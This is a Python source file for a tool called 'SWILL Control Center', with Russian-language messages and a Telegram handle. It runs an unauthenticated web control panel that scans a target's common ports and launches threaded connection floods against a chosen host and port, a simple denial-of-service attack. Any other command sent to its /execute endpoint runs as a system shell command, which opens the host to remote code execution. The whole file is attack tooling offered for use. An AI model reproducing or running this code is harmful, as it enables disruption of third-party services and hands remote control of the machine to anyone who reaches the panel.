#!/usr/bin/env python3
# SWILL Backend Server

import socket
import json
import subprocess
import threading
import os
import sys
import time
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class SWILLServer:
    def __init__(self, port=5000):
        self.port = port
        self.running = True
        self.targets = []
        self.attack_threads = []
        
    def start(self):
        print(f"[SWILL] Запуск сервера на порту {self.port}")
        print(f"[SWILL] Управление: http://localhost:{self.port}/index.html")
        
        handler = self.create_handler()
        httpd = HTTPServer(('0.0.0.0', self.port), handler)
        httpd.serve_forever()
    
    def create_handler(self):
        server = self
        
        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/status':
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    response = json.dumps({"status": "active", "targets": len(server.targets)})
                    self.wfile.write(response.encode())
                elif self.path == '/index.html':
                    # Serve the HTML file
                    try:
                        with open('index.html', 'r', encoding='utf-8') as f:
                            html = f.read()
                        self.send_response(200)
                        self.send_header('Content-Type', 'text/html')
                        self.end_headers()
                        self.wfile.write(html.encode())
                    except FileNotFoundError:
                        self.send_response(404)
                        self.end_headers()
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                body = self.rfile.read(content_length)
                data = json.loads(body.decode())
                
                if self.path == '/execute':
                    command = data.get('command', '')
                    result = server.execute_command(command)
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    response = json.dumps({"result": result})
                    self.wfile.write(response.encode())
            
            def log_message(self, format, *args):
                print(f"[SWILL] {args}")
        
        return Handler
    
    def execute_command(self, command):
        """Обработка команд от веб-интерфейса"""
        try:
            if command.startswith('/scan'):
                # Сканирование портов
                target = command.split(' ')[1] if len(command.split(' ')) > 1 else 'localhost'
                return self.scan_ports(target)
            
            elif command.startswith('/attack'):
                # Запуск атаки
                parts = command.split(' ')
                if len(parts) >= 3:
                    target = parts[1]
                    port = int(parts[2])
                    return self.start_attack(target, port)
                return "Использование: /attack <target> <port>"
            
            elif command == '/help':
                return """Доступные команды:
/scan <target> - сканирование портов
/attack <target> <port> - запуск атаки
/list - список активных целей
/stop - остановить все атаки
/clear - очистить лог"""
            
            elif command == '/list':
                if self.targets:
                    return "Активные цели:\n" + "\n".join(self.targets)
                return "Нет активных целей"
            
            elif command == '/stop':
                self.running = False
                return "Остановка всех атак..."
            
            elif command == '/clear':
                return "Лог очищен"
            
            else:
                # Выполнение системной команды
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                return result.stdout + result.stderr
                
        except Exception as e:
            return f"Ошибка: {str(e)}"
    
    def scan_ports(self, target):
        """Сканирование портов целевого хоста"""
        open_ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]
        
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        
        if open_ports:
            return f"Открытые порты на {target}: {', '.join(map(str, open_ports))}"
        return f"Нет открытых портов на {target}"
    
    def start_attack(self, target, port):
        """Запуск атаки на цель"""
        self.targets.append(f"{target}:{port}")
        
        def attack_worker():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((target, port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                    sock.close()
                    time.sleep(0.01)
                except:
                    pass
        
        thread = threading.Thread(target=attack_worker)
        thread.daemon = True
        thread.start()
        self.attack_threads.append(thread)
        
        return f"Атака запущена на {target}:{port}"

def main():
    print("""
    ╔══════════════════════════════════╗
    ║     SWILL Control Center v1.0    ║
    ║     TG: t.me/Swill_Way           ║
    ╚══════════════════════════════════╝
    """)
    
    server = SWILLServer()
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[SWILL] Остановка сервера...")
        sys.exit(0)

if __name__ == '__main__':
    main()
